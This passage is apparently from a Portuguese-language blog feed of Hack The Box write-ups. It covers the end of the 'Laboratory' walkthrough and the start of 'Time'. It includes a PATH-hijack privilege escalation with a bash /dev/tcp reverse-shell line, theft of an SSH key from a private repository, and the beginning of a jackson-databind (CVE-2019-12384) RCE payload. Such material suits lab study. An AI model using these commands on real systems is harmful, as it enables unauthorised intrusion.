irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:002:0&amp;gt; user.password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;P@ssw0rd&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;P@ssw0rd&quot;&lt;/span&gt;
irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:003:0&amp;gt; user.password_confirmation &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;P@ssw0rd&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;P@ssw0rd&quot;&lt;/span&gt;
irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:004:0&amp;gt; user.save!
Enqueued ActionMailer::DeliveryJob &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Job ID: 0f18c1b4-9929-47a5-90d7-ec16a7e6f293&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to Sidekiq&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mailers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with arguments: &lt;span class=&quot;s2&quot;&gt;&quot;DeviseMailer&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;password_change&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;deliver_now&quot;&lt;/span&gt;, &lt;span class=&quot;c&quot;&gt;#&amp;lt;GlobalID:0x00007fa424ee0668 @uri=#&amp;lt;URI::GID gid://gitlab/User/1&amp;gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:005:0&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após alterada a senha, foi possível visualizar para a conta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dexter&lt;/code&gt; um repositório privado adicional chamado &lt;strong&gt;SecureDocker&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/oXJEKFR.png&quot; alt=&quot;gitlab dexter projects&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Já que temos acesso ao código-fonte do repositório, notado que existem alguns scripts e &lt;strong&gt;chave SSH&lt;/strong&gt; do usuário dexter, conforme mencionado na descrição do repositório.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I’ll figure that out later.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Após clonar o repositório para máquina local observados os seguintes arquivos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; http.sslVerify&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;clone http://git.laboratory.htb/dexter/securedocker.git  
Cloning into &lt;span class=&quot;s1&quot;&gt;'securedocker'&lt;/span&gt;...
Username &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://git.laboratory.htb'&lt;/span&gt;: dexter
Password &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://dexter@git.laboratory.htb'&lt;/span&gt;: 
warning: redirecting to https://git.laboratory.htb/dexter/securedocker.git/
remote: Enumerating objects: 10, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10/10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9/9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
remote: Total 10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 0
Receiving objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10/10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tree &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.git'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
├── create_gitlab.sh
├── dexter
│   ├── recipe.url
│   ├── .ssh
│   │   ├── authorized_keys
│   │   └── id_rsa
│   └── todo.txt
└── README.md

2 directories, 6 files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Assim como na máquina &lt;a href=&quot;/writeup/2021/03/htb-luanne/&quot;&gt;Luanne&lt;/a&gt;, realizado a conversão da chave para RSA, utilizando os comandos abaixo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; PEM &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./id_rsa
Key has comment &lt;span class=&quot;s1&quot;&gt;'root@laboratory'&lt;/span&gt;
Enter new passphrase &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;no passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após o procedimento mencionado, foi possível conectar-se à máquina via SSH e obter a flag a partir do usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dexter&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa dexter@10.10.10.216
  dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
  total 40
  drwxr-xr-x 6 dexter dexter 4096 Oct 22 08:42 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
  drwxr-xr-x 3 root   root   4096 Jun 26  2020 ..
  lrwxrwxrwx 1 root   root      9 Jul 17  2020 .bash_history -&amp;gt; /dev/null
  &lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dexter dexter  220 Feb 25  2020 .bash_logout
  &lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dexter dexter 3771 Feb 25  2020 .bashrc
  drwx------ 2 dexter dexter 4096 Jun 26  2020 .cache
  drwx------ 2 dexter dexter 4096 Oct 22 08:14 .gnupg
  drwxrwxr-x 3 dexter dexter 4096 Jun 26  2020 .local
  &lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dexter dexter  807 Feb 25  2020 .profile
  drwx------ 2 dexter dexter 4096 Jun 26  2020 .ssh
  &lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt; 1 root   dexter   33 Feb 19 11:06 user.txt
  dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
  &amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;Após executar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; novamente, desta vez na máquina de fato, notei que existe um arquivo SUID, com permissão atribuida para o usuário &lt;strong&gt;dexter&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /usr/local/bin/docker-security
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ao executar este binário, não observei nenhum output, assim como não exibe nenhum tipo de informação/ajuda usando parametros como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--version&lt;/code&gt; e &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--help&lt;/code&gt;. Analisando o mesmo mais a fundo notei que se trata de um arquivo executável, o qual pode conter alguma informação do que se utiliza para algum eventual path hijack ou buffer overflow.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /usr/local/bin/docker-security
/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;d466f1fb0f54c0274e5d05974e81f19dc1e76602, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Antes de utilizar ferramentas de disassembly, inspecionado as strings do arquivo a partir da máquina atacante (uma vez que a máquina não possui o binário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt;) e algumas entradas chamaram a atenção, sendo elas a chamada do binário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; para redefinir as permissões no diretório docker, porém sem especificar o caminho completo. Isso implica que este app &lt;strong&gt;é vulnerável &lt;em&gt;path hijacking&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings docker-security
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]

&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;A&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;A^A_
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;700 /usr/bin/docker
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;660 /var/run/docker.sock
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;3&lt;span class=&quot;s2&quot;&gt;$&quot;
GCC: (Debian 10.1.0-6) 10.1.0

[...]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;path-hijack&quot;&gt;Path hijack&lt;/h3&gt;

&lt;p&gt;Para obter privilégios de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, uma vez que o binário que possui SUID é vulnerável, o primeiro passo é criar um &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; &lt;strong&gt;falso&lt;/strong&gt;, neste caso gerando um shell reverso, seguido da alteração do PATH para que o caminho onde o arquivo localizado seja buscado no início da execução.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#!/bin/bash'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/shm/chmod
dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/4443 0&amp;gt;&amp;amp;1'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /dev/shm/chmod
dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /dev/shm/chmod
dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/shm:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após configurar um listener na porta especificada (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 4443&lt;/code&gt;) executado o binário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-security&lt;/code&gt; o que retornou um shell reverso com privilégios de &lt;strong&gt;root&lt;/strong&gt;, permitindo assim a obtenção da flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4443                                                                                             
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.10] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.216] 44754
root@laboratory:~# &lt;span class=&quot;nb&quot;&gt;id  
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dexter&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@laboratory:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Espero que tenham gostado!&lt;/p&gt;

&lt;p&gt;Vejo vocês novamente em breve! :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-easy" /><category term="htb-linux" /><summary type="html">Olá pessoal! A máquina desta semana será Laboratory, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xc45.</summary></entry><entry><title type="html">Hackthebox write-up: Time</title><link href="https://davicruz.com/writeup/2021/04/htb-time/" rel="alternate" type="text/html" title="Hackthebox write-up: Time" /><published>2021-04-03T13:00:00-03:00</published><updated>2021-04-03T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/04/htb-time</id><content type="html" xml:base="https://davicruz.com/writeup/2021/04/htb-time/">&lt;p&gt;Olá pessoal!&lt;/p&gt;

&lt;p&gt;A máquina desta semana será &lt;strong&gt;Time&lt;/strong&gt;, outra máquina Linux classificada como mediana do &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, criada por &lt;a href=&quot;https://app.hackthebox.eu/users/94858&quot;&gt;egotisticalSW&lt;/a&gt; e &lt;a href=&quot;https://app.hackthebox.eu/users/27390&quot;&gt;felamos&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/UViaunV.png&quot; alt=&quot;HTB Time&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeração&quot;&gt;Enumeração&lt;/h2&gt;

&lt;p&gt;Iniciamos com a enumeração dos serviços publicado a partir de um quick scan do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, onde o output se encontra abaixo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.214
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-26 16:08 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.214
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.077s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Online JSON parser
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;10.70 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;80tcp---serviço-http&quot;&gt;80/TCP - Serviço HTTP&lt;/h3&gt;

&lt;p&gt;Iniciando a verificação pelo serviço HTTP que executa na porta 80, vemos que temos um serviço de validação e formatação de arquivo JSON&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/KWUpOXL.png&quot; alt=&quot;Online JSON Parser - Time&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Após executar algumas enumerações utilizando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; e &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nikto&lt;/code&gt; não encontrei nada útil, logo parti para a enumeração da aplicação buscando por alguma vulnerabilidade de injeção de código ou LFI.&lt;/p&gt;

&lt;p&gt;Analisando a aplicação temos duas funcionalidades: &lt;strong&gt;Beautify&lt;/strong&gt; e &lt;strong&gt;Validate&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A opção &lt;strong&gt;beautify&lt;/strong&gt;, ao receber um JSON válido, o formata de forma “bonita” e, ao enviar um request inválido (por exemplo “test”), retorna o valor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gwqqcNt.png&quot; alt=&quot;Online JSON Parser - Time - beautify&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Já a opção em beta &lt;strong&gt;validate&lt;/strong&gt; verifica a sintaxe do JSON fornecido. Quando enviamos um request inválido (por exemplo “test”), exceção não esperada da aplicação é exibida.&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;acesso-inicial&quot;&gt;Acesso inicial&lt;/h2&gt;

&lt;p&gt;Ao buscar por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.fasterxml.jackson.core&lt;/code&gt; encontrei detalhes sobre o projeto &lt;strong&gt;Jackson&lt;/strong&gt;, desenvolvido pela &lt;strong&gt;FasterXML&lt;/strong&gt; e do qual o componente core é base para o &lt;a href=&quot;https://github.com/FasterXML/jackson-databind&quot;&gt;jackson-databind&lt;/a&gt;, popular pela sua biblioteca de JSON, a qual é implementada neste portal para as funcionalidades de validação e formatação.&lt;/p&gt;

&lt;p&gt;Pesquisando por CVEs para o jackson-databind, os seguintes foram encontrados para execução de código em 2019, de acordo com o site &lt;a href=&quot;https://www.cvedetails.com&quot;&gt;CVE Details&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ju87o1J.png&quot; alt=&quot;CVE Details&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dos 4 itens listados, encontrei para o &lt;strong&gt;CVE-2019-12384&lt;/strong&gt; um PoC funcional &lt;a href=&quot;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&quot;&gt;neste blog&lt;/a&gt;, o qual utilizei para obter o acesso inicial. Os seguintes passos foram executados para obter um shell reverso:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Criação de um arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inject.sql&lt;/code&gt; com o código abaixo, modificado da versão do blog para iniciar um shell reverso para a máquina atacante na porta 4443 e publicado usando um servidor HTTP python3 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo python3 -m http.server 80&lt;/code&gt;) a partir do diretório de onde o arquivo se encontra.&lt;/p&gt;

    &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ALIAS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHELLEXEC&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellexec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
